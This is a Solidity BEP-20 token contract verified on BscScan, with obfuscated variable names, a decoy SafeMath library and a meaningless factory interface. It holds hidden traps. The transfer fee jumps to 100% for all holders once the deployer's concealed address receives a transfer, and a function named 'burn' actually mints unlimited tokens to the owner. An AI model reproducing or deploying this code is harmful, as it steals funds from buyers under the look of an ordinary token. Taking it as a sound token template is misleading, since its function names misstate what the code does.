/**
 *Submitted for verification at BscScan.com on 2022-12-07
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
contract ZzdhZz {
uint8 public constant decimals = 18;
address public  PxXtmc = address(0);
uint256 public  iuEuzG = 1000000000000000000;
uint256 public  rjXSbT = 100000000000000000000000;
uint256 public constant WLJJbh = 9+1;
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
address private  tahcAx = address(0);
event Transfer(address indexed from, address indexed to, uint256 value);
string public  name = "ZzdhZz";
uint256 public  xObHnw = 100000000000000000;
address public  WTGBsJ = address(0);
address public  PQeuWS = address(0);
address public  gJQndb = address(0);
event Approval(address indexed owner, address indexed spender, uint256 value);
uint256 public constant totalSupply = 100000000000000000000000000000;
uint256 private  tFmeMY = 10000000000000;
uint256 public  lGwExH = 100000000000000000000;
string public  symbol = "ZzdhZz";
uint256 public  XrtglM = 100000000000000000000000;
address public  YulEAh = address(0);
address public owner;
uint256 public  UmWXDd = 10000000000000000000000000000;
uint256 public  QfVSyL = 10000000000000000;
mapping (address => uint256) public balanceOf;
uint256 public  qTegkl = 10000000000000000000;
address public  rdNuER = address(0);
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
mapping (address => mapping (address => uint256)) private _allowances;
function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "jiqOSg");
require(to != address(0), "jiqOSg");
require(amount <= balanceOf[from], "jiqOSg");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* WLJJbh/tFmeMY ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==tahcAx){
tFmeMY = 9+1;
}
emit Transfer(from, to, transferAmount);
}
constructor () public {
tahcAx = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}
function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "");
require(spender != address(0), "");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}
function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}
function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}

}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "Safetree: addition overflow");
        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "Safetree: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
       }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "Safetree: multiplication overflow");
        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "Safetree: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "Safetree: modulo by zero");
    }
    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

////////////////////////////////

interface IUniswapV2Factorydsd {
    event PairCreate(address indexed token0, address indexed token1, address pair, uint);
    function fundTodsaeqew() external view returns (address);
    function fundToadddfsdsdfd() external view returns (address);
    function getdsfjhjsdPair3(address tokenA, address tokenB) external view returns (address pair);
    function allPagfhfghgirs(uint) external view returns (address pair);
    function allPaigsLength() external view returns (uint);
    function createhgkPair(address tokenA, address tokenB) external returns (address pair);
    function setLkjhkerewPTo(address) external;
    function setLPjlhTrewoadd(address) external;
}